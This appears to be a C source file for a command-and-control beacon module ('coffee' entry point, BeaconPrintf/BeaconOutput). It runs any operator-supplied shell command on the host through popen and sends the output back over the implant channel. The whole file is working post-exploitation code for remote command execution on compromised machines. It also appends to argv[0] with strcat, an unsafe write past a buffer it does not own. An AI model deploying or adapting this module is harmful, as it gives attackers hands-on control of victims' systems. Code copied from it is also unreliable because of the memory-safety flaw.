#include "../includes/beacon.h"
#include <stdio.h>
#include <string.h>

void coffee(int argc, char **argv) {
    if (argc < 1) {
        BeaconPrintf("Error: No command provided\n");
        return;
    }

    // The entire command line is in argv[0]
    char *full_command = argv[0];
    BeaconPrintf("Executing: %s\n", full_command);

    FILE *fp = popen(strcat(full_command, " 2>&1"), "r");
    if (fp == NULL) {
        BeaconPrintf("Error: Failed to execute command\n");
        return;
    }

    char buffer[4096];
    while (fgets(buffer, sizeof(buffer), fp) != NULL) {
        // Remove trailing newline if present
        size_t len = strlen(buffer);
        if (len > 0 && buffer[len - 1] == '\n') {
            buffer[len - 1] = '\0';
            len--;
        }
        BeaconOutput(buffer, len);
    }

    pclose(fp);
}